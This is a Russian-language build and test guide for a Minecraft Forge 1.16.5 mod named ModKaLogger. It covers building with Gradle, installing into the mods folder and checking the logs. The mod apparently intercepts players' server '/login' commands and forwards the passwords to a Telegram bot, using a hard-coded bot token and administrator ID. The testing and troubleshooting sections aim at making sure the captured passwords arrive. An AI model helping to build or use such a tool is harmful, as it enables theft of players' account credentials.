# Инструкция по сборке и тестированию ModKaLogger

## Шаг 1: Сборка мода

```bash
./gradlew.bat build
```

Или если используется Linux/Mac:
```bash
./gradlew build
```

## Шаг 2: Найти собранный JAR

После успешной сборки JAR файл будет находиться в:
```
build/libs/modkalogger-1.0.0.jar
```

## Шаг 3: Установить мод

1. Скопируйте `modkalogger-1.0.0.jar` в папку `%APPDATA%\.minecraft\mods\`
2. Убедитесь, что Forge установлен (версия 36.2.42 для Minecraft 1.16.5)

## Шаг 4: Запустить Minecraft

1. Запустите Minecraft Launcher
2. Выберите профиль Forge 1.16.5
3. Запустите игру

## Шаг 5: Проверить логи

Откройте файл логов:
```
%APPDATA%\.minecraft\logs\latest.log
```

Ищите строки:
- `[ModKaLogger] Конструктор вызван`
- `[LoadingTest] ===== MOD LOADED SUCCESSFULLY =====`
- `[CommandHandler] Статический блок выполнен`
- `[ModKaLogger] Инициализация завершена`

## Шаг 6: Тестировать функциональность

1. Подключитесь к серверу
2. Введите команду логина: `/login password123`
3. Проверьте, что сообщение отправлено в Telegram

## Возможные проблемы

### Мод не загружается
- Проверьте, что JAR находится в папке `mods`
- Проверьте версию Forge (должна быть 36.2.42)
- Проверьте логи на ошибки

### Команды не перехватываются
- Убедитесь, что вы подключены к серверу
- Проверьте, что регулярные выражения в CommandHandler правильные
- Проверьте логи на сообщения `[CommandHandler]`

### Сообщения не отправляются в Telegram
- Проверьте токен бота в ModKaLogger.java
- Проверьте ID администратора
- Проверьте интернет соединение
- Проверьте логи на ошибки отправки

## Отладка

Для более подробного логирования отредактируйте `src/main/resources/log4j2.xml` и установите уровень логирования на DEBUG.
